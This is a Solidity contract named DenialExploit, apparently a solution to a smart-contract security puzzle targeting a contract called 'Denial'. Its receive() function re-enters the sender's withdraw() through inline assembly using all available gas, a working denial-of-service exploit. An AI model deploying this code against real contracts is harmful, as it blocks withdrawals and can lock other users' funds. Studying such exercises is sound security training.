// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Denial {
    function withdraw() external;
}

contract DenialExploit {
    receive() external payable {
        // Denial(msg.sender).withdraw();
        assembly {
            mstore(0, "withdraw()")
            mstore(0, keccak256(0, 10))
            pop(call(gas(), caller(), 0, 0, 4, 0, 0))
        }
    }
}
